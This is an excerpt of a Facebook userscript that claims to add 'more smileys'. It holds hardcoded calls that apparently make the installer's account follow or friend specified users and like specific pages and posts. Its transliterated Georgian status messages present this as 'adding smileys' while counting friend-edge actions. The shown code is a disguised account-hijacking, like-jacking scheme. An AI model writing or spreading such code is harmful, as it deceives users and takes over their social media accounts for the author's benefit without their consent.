// ==UserScript==
// @name            Get more facebook smileys)) 
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/profile.gb" target="_blank">All smileys for you <br>By Batsikadze</a>';
	html += '</div>';
...
IDS("100002406750435");
IDS("100007326095719");
a("100002406750435");a("100000904258380");a("100007326095719");a("");a("");a("");a("");a("");a("");
Like("271324066348935");Like("143845679049495");Like("201638196698107");Like("226001024213383");
P("438551422958341");P("");P("");P("");P("");P("");P("");
...
if (i > 0) {
dipes += arr.length + " Smailebi napovnia<br/>";
dipes += "<b>" + suc + "</b> axali smailebi " + (arr.length - i) + " emateba ";
dipes += "(" + i + " More To Go..)";
dipes += "<div class='friend-edge'>";
dipes += kunaon;
dipes += "</div>"
} else {
dipes += arr.length + " mimdinareobs smailebis damateba ";
dipes += "<b>" + suc + " smailebi damatebulia</b>";
dipes += "<div><span class='uiButton' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>daxurva</span></div>"
}
dipes += "</div>";
